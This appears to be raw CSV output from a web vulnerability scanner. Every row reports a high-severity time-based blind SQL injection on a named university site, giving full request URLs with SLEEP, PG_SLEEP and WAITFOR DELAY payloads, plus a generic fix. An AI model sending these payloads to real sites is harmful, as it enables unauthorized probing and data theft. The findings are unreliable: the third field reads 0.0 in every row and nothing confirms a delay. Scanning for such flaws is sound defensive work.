Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/admissions/downloads/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/admissions/downloads/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/admissions/downloads/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/admissions/downloads/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/admissions/downloads/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/admissions/downloads/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/admissions/downloads/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=1%27+AND+PG_SLEEP%285%29--),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/examinations/examination-reforms/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=1+OR+SLEEP%285%29),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/examinations/examination-reforms/?q=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/examinations/examination-reforms/?page=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/examinations/examination-reforms/?cmd=1%27+AND+SLEEP%285%29--),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/examinations/examination-reforms/?id=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/examinations/examination-reforms/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/examinations/examination-reforms/?query=1%27%3B+SELECT+PG_SLEEP%285%29--),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?cmd=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?q=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?search=SLEEP%285%29%23),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/office-of-international-affairs/bon-voyage-scholarship/?query=1%22+AND+SLEEP%285%29--),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
